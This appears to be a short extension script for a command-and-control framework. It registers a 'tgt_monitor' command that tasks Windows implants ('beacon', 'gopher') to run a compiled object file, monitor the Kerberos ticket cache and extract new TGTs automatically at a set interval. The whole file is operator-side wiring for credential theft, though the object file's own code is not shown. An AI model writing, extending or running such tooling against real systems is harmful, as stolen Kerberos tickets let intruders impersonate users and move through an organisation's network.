var metadata = {
    name: "TGT-Monitor",
    description: "Kerberos TGT Monitoring"
};

let _cmd_monitor = ax.create_command("tgt_monitor", "Monitor Kerberos cache for new TGTs and extract them automatically", "tgt_monitor /interval:30");
_cmd_monitor.addArgString("params", "Args: [/interval:SECONDS] (defaults: interval=30)", "");
_cmd_monitor.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = parsed_json["params"] || "";

    let bof_params = ax.bof_pack("cstr", [params]);
    let bof_path = ax.script_dir() + "_bin/monitor." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof -a "${bof_path}" ${bof_params}`, "Task: TGT Monitor");
});


var group_tgt_monitor = ax.create_commands_group("TGT-MONITOR", [_cmd_monitor]);
ax.register_commands_group(group_tgt_monitor, ["beacon", "gopher", "NoNameAx"], ["windows"], []);
